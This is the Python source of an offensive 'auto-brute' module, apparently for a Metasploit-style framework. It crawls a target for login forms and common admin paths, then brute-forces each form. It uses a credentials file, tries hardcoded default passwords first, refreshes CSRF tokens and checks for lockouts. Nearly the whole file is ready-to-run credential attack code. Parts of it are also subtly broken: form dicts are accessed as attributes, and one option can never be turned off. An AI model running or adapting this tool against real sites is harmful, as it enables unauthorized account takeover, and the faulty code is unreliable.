"""
Auto-Brute — crawl for login forms, then brute force all detected forms automatically.
Combines form_crawler + brute_force into a single attack module.

Usage (module):
    use auxiliary/scanners/auto_bruteforce
    set RHOSTS target.com
    set CREDS_FILE user:pass.txt
    run

Usage (CLI):
    auto-brute target.com user:pass.txt
"""
from __future__ import annotations
import re
import time
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from webforg.core.module import BaseAuxiliaryModule, Option
from webforg.core.session import sessions
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn
from rich import box

console = Console()


class Scanner(BaseAuxiliaryModule):
    """Automatically detects login forms on a target and brute forces them all with user:pass combos."""

    name = "Auto-Brute Force"
    description = "Crawls target for login forms then brute forces all detected forms with user:pass list"
    author = "webforg"
    rank = "excellent"

    COMMON_LOGIN_PATHS = [
        "/", "/login", "/signin", "/sign-in", "/auth", "/authenticate",
        "/admin", "/admin/login", "/administrator", "/wp-login.php",
        "/user/login", "/accounts/login", "/account/login",
        "/wp-admin/", "/manager", "/cpanel", "/webmail",
        "/portal", "/console", "/dashboard/login",
        "/api/auth/login", "/api/login", "/api/v1/login",
        "/_login", "/oauth/login", "/sso/login",
    ]

    def _build_options(self) -> None:
        super()._build_options()
        self.add_option("TARGETURI", Option(str, required=False, default="/", description="Starting path"))
        self.add_option("TIMEOUT", Option(int, required=False, default=10, description="HTTP timeout"))
        self.add_option("CREDS_FILE", Option(str, required=True, description="File with user:pass combos (one per line)"))
        self.add_option("THREADS", Option(int, required=False, default=1, description="Threads per form"))
        self.add_option("DELAY", Option(float, required=False, default=0.5, description="Delay between attempts (s)"))
        self.add_option("MAX_ATTEMPTS", Option(int, required=False, default=200, description="Max attempts per form"))
        self.add_option("FOLLOW_LINKS", Option(bool, required=False, default=True, description="Follow links when crawling"))
        self.add_option("DEPTH", Option(int, required=False, default=1, description="Crawl depth"))
        self.add_option("MAX_PAGES", Option(int, required=False, default=30, description="Max pages to crawl"))
        self.add_option("FAIL_STRING", Option(str, required=False, default=None, description="String indicating failed login"))
        self.add_option("SUCCESS_STRING", Option(str, required=False, default=None, description="String indicating success"))
        self.add_option("PROGRESSIVE", Option(bool, required=False, default=True, description="Try common creds first, then full list"))

    def run(self) -> dict:
        base_url = self.target.base_url
        timeout = self.get_option("TIMEOUT") or 10
        depth = self.get_option("DEPTH") or 1
        max_pages = self.get_option("MAX_PAGES") or 30
        threads = self.get_option("THREADS") or 1
        delay = self.get_option("DELAY") or 0.5
        max_attempts = self.get_option("MAX_ATTEMPTS") or 200
        progressive = self.get_option("PROGRESSIVE") or True

        console.print()
        console.print(f"  [bold red]>[/] Auto-Brute Force — [bold]{base_url}[/]")
        console.print()

        # ── Phase 1: Load credentials ──
        combos = self._load_combos()
        if not combos:
            return {"success": False, "error": "No credentials loaded from CREDS_FILE"}

        console.print(f"  [bold cyan]>[/] Loaded [bold]{len(combos)}[/] user:pass combos")
        console.print()

        # ── Phase 2: Crawl for forms ──
        console.print(f"  [bold cyan]>[/] Phase 1: Crawling for login forms...")
        forms = self._crawl_forms(depth, max_pages, timeout)
        console.print(f"  [bold green]>[/] Found [bold]{len(forms)}[/] login form(s)")
        console.print()

        if not forms:
            console.print("  [bold yellow]>[/] No login forms detected. Try setting TARGETURI to a known login page.")
            return {"success": True, "forms": 0, "found": []}

        # ── Phase 3: Brute force each form ──
        console.print(f"  [bold cyan]>[/] Phase 2: Brute forcing {len(forms)} form(s)...")
        console.print()

        all_found = []
        total_forms = len(forms)

        for form_idx, form in enumerate(forms, 1):
            console.print(f"  [bold cyan]>[/] ── Form {form_idx}/{total_forms}: {form.method} {form.action_url} ──")
            console.print(f"    [dim]user=[/]{form.user_field} [dim]pass=[/]{form.pass_field} [dim]csrf=[/]{form.csrf_field or 'none'}")

            found = self._brute_form(form, combos, threads, delay, max_attempts, timeout, progressive)
            if found:
                all_found.extend(found)
                for f in found:
                    console.print(f"    [bold green][+] FOUND: {f['username']}:{f['password']}[/]")
            else:
                console.print(f"    [dim]No credentials found[/]")
            console.print()

        # ── Summary ──
        console.print("=" * 60)
        console.print("  AUTO-BRUTE SUMMARY")
        console.print("=" * 60)
        console.print(f"  Forms tested:  {total_forms}")
        console.print(f"  Combos tried:  {len(combos)}")
        console.print(f"  Valid logins:  [bold green]{len(all_found)}[/]")
        console.print("=" * 60)

        if all_found:
            console.print()
            console.print("  [bold green]═══ VALID CREDENTIALS ═══[/]")
            for f in all_found:
                console.print(f"  [bold green][OK][/] [bold]{f['username']}[/]:[bold yellow]{f['password']}[/]  ({f['form_url']})")
            console.print()

            # Create session for first found
            session = sessions.create(
                target=self.target,
                module_name=self.name,
                payload_name="web_login",
            )
            return {
                "success": True,
                "found": all_found,
                "forms_tested": total_forms,
                "session_id": session.id,
            }

        return {
            "success": True,
            "found": [],
            "forms_tested": total_forms,
        }

    def _load_combos(self) -> list[tuple[str, str]]:
        """Load user:pass combos from file."""
        path = self.get_option("CREDS_FILE")
        if not path:
            return []

        combos = []
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if ":" in line:
                        user, pwd = line.split(":", 1)
                        combos.append((user.strip(), pwd.strip()))
        except FileNotFoundError:
            console.print(f"  [bold red]>[/] File not found: {path}")
            return []

        return combos

    def _crawl_forms(self, depth: int, max_pages: int, timeout: int) -> list[dict]:
        """Crawl target and return detected login forms."""
        base_url = self.target.base_url
        visited = set()
        forms = []

        def crawl_page(url: str, current_depth: int):
            if len(visited) >= max_pages or url in visited or current_depth > depth:
                return
            visited.add(url)

            try:
                resp = self.target.session.get(url, timeout=timeout)
            except Exception:
                return

            # Extract login forms
            page_forms = self._extract_forms(url, resp)
            forms.extend(page_forms)

            # Follow links
            if current_depth < depth:
                links = self._extract_links(url, resp.text)
                for link in links:
                    if self._is_same_domain(link) and link not in visited:
                        crawl_page(link, current_depth + 1)

        # Start crawl
        start_path = (self.get_option("TARGETURI") or "/").rstrip("/")
        crawl_page(f"{base_url}{start_path}", 0)

        # Check common paths
        for path in self.COMMON_LOGIN_PATHS:
            if len(visited) >= max_pages:
                break
            url = f"{base_url}{path}"
            if url not in visited:
                crawl_page(url, 0)

        # Deduplicate
        seen = set()
        unique = []
        for f in forms:
            key = (f["action_url"], f["user_field"], f["pass_field"])
            if key not in seen:
                seen.add(key)
                unique.append(f)

        return unique

    def _brute_form(
        self, form: dict, combos: list[tuple[str, str]],
        threads: int, delay: float, max_attempts: int,
        timeout: int, progressive: bool,
    ) -> list[dict]:
        """Brute force a single form. Returns list of found creds."""
        action_url = form["action_url"]
        method = form["method"]
        user_field = form["user_field"]
        pass_field = form["pass_field"]
        hidden_fields = form.get("hidden_fields", {})
        csrf_field = form.get("csrf_field", "")
        csrf_token = form.get("csrf_token", "")
        enctype = form.get("enctype", "")

        fail_string = self.get_option("FAIL_STRING")
        success_string = self.get_option("SUCCESS_STRING")

        # Progressive mode: try common admin creds first
        if progressive:
            priority_combos = [
                ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
                ("admin", "admin123"), ("root", "root"), ("root", "toor"),
                ("admin", "root"), ("test", "test"), ("guest", "guest"),
                ("administrator", "administrator"), ("admin", ""),
            ]
            # Add user-provided combos after
            all_combos = priority_combos + [(u, p) for u, p in combos if (u, p) not in priority_combos]
        else:
            all_combos = list(combos)

        all_combos = all_combos[:max_attempts]
        found = []
        found_any = False
        lockout = False
        start_time = time.time()
        attempts = [0]
        attempts_lock = threading.Lock()

        # Get a fresh CSRF token before brute forcing
        if csrf_field:
            try:
                fresh_resp = self.target.session.get(action_url, timeout=timeout)
                new_csrf = self._extract_csrf_from_page(fresh_resp.text, csrf_field)
                if new_csrf:
                    csrf_token = new_csrf
                    console.print(f"    [dim]Refreshed CSRF token: {csrf_token[:20]}...[/]")
            except Exception:
                pass

        def try_combo(combo):
            nonlocal found_any, lockout
            if found_any:
                return None

            user, pwd = combo

            with attempts_lock:
                attempts[0] += 1

            # Build payload
            data = dict(hidden_fields)
            data[user_field] = user
            data[pass_field] = pwd
            if csrf_field:
                data[csrf_field] = csrf_token

            try:
                if method == "GET":
                    resp = self.target.session.get(action_url, params=data, timeout=timeout)
                else:
                    if enctype == "multipart/form-data":
                        resp = self.target.session.post(action_url, data=data, timeout=timeout)
                    else:
                        resp = self.target.session.post(action_url, data=data, timeout=timeout)

                body = resp.text.lower()
                status = resp.status_code

                # Check lockout
                if status == 429 or "locked" in body or "too many" in body or "rate limit" in body:
                    lockout = True
                    return {"username": user, "password": pwd, "status": "LOCKED"}

                # Check success
                is_success = False
                if success_string:
                    if success_string.lower() in body:
                        is_success = True
                elif fail_string:
                    if fail_string.lower() not in body and status in (200, 302):
                        is_success = True
                else:
                    # Default: redirect away from login = success
                    if status in (301, 302, 303) and "login" not in resp.url.lower():
                        is_success = True
                    # Or check for dashboard/admin indicators
                    elif any(kw in body for kw in ("dashboard", "welcome", "logout", "sign out", "my account")):
                        is_success = True

                if is_success:
                    found_any = True
                    return {
                        "username": user, "password": pwd,
                        "status": "FOUND",
                        "form_url": action_url,
                        "http_status": status,
                        "redirect": resp.url if status in (301, 302, 303) else "",
                    }

                return {"username": user, "password": pwd, "status": "FAIL"}

            except Exception as e:
                return {"username": user, "password": pwd, "status": "ERROR", "error": str(e)[:40]}

        # Run brute force
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold green]{task.description}[/]"),
            BarColumn(bar_width=25),
            MofNCompleteColumn(),
            TextColumn("[bold]{task.fields[speed]}[/]"),
        ) as progress:
            task = progress.add_task(
                f"  Brute forcing",
                total=len(all_combos),
                speed="0/s",
            )

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {}
                for combo in all_combos:
                    if found_any or lockout:
                        break
                    future = executor.submit(try_combo, combo)
                    futures[future] = combo
                    if threads == 1 and delay > 0:
                        time.sleep(delay)

                for future in as_completed(futures):
                    try:
                        result = future.result()
                    except Exception:
                        continue
                    if result:
                        if result["status"] == "FOUND":
                            found.append(result)
                        elif result["status"] == "LOCKED":
                            lockout = True
                        speed = f"{attempts[0] / max(time.time() - start_time, 0.01):.1f}/s"
                        progress.update(task, advance=1, speed=speed)

        return found

    def _extract_forms(self, page_url: str, resp) -> list[dict]:
        """Extract login forms from HTML page."""
        forms = []
        html = resp.text

        form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        for match in form_pattern.finditer(html):
            form_html = match.group(0)
            form_tag = form_html.split(">")[0] + ">"

            # Must have password field
            if 'type=["\']password["\']' not in form_html.lower():
                if not re.search(r'name=["\'](?:password|pass|pwd)["\']', form_html, re.IGNORECASE):
                    continue

            form = {"action_url": "", "method": "POST", "user_field": "username", "pass_field": "password",
                    "hidden_fields": {}, "csrf_field": "", "csrf_token": "", "enctype": ""}

            # Action
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_tag, re.IGNORECASE)
            form["action_url"] = urllib.parse.urljoin(page_url, action_match.group(1)) if action_match else page_url

            # Method
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_tag, re.IGNORECASE)
            form["method"] = method_match.group(1).upper() if method_match else "POST"

            # Enctype
            enctype_match = re.search(r'enctype=["\']([^"\']*)["\']', form_tag, re.IGNORECASE)
            form["enctype"] = enctype_match.group(1) if enctype_match else ""

            # Inputs
            for inp in re.findall(r'<input[^>]*>', form_html, re.IGNORECASE):
                name_m = re.search(r'name=["\']([^"\']+)["\']', inp)
                type_m = re.search(r'type=["\']([^"\']+)["\']', inp)
                val_m = re.search(r'value=["\']([^"\']*)["\']', inp)
                if not name_m:
                    continue

                fname = name_m.group(1)
                ftype = type_m.group(1).lower() if type_m else "text"
                fval = val_m.group(1) if val_m else ""

                if ftype == "hidden":
                    form["hidden_fields"][fname] = fval
                    if any(kw in fname.lower() for kw in ("csrf", "token", "_token", "nonce", "verify")):
                        form["csrf_token"] = fval
                        form["csrf_field"] = fname
                elif ftype == "password":
                    form["pass_field"] = fname
                elif ftype in ("text", "email", "tel"):
                    if form["user_field"] == "username":
                        form["user_field"] = fname

            forms.append(form)

        return forms

    def _extract_csrf_from_page(self, html: str, field_name: str) -> str:
        """Extract CSRF token value from page HTML."""
        patterns = [
            rf'name=["\']?{re.escape(field_name)}["\']?\s+value=["\']([^"\']+)["\']',
            rf'value=["\']([^"\']+)["\']\s+name=["\']?{re.escape(field_name)}["\']',
        ]
        for pat in patterns:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(1)
        return ""

    def _extract_links(self, base_url: str, html: str) -> list[str]:
        """Extract same-domain links from HTML."""
        links = []
        parsed_base = urllib.parse.urlparse(base_url)
        for m in re.finditer(r'href=["\']([^"\']+)["\']', html, re.IGNORECASE):
            href = m.group(1)
            if href.startswith(("#", "javascript:", "mailto:")):
                continue
            full = urllib.parse.urljoin(base_url, href)
            parsed = urllib.parse.urlparse(full)
            if parsed.netloc == parsed_base.netloc:
                links.append(urllib.parse.urlunparse(parsed._replace(fragment="")))
        return links

    def _is_same_domain(self, url: str) -> bool:
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc == "" or parsed.netloc == self.target.host
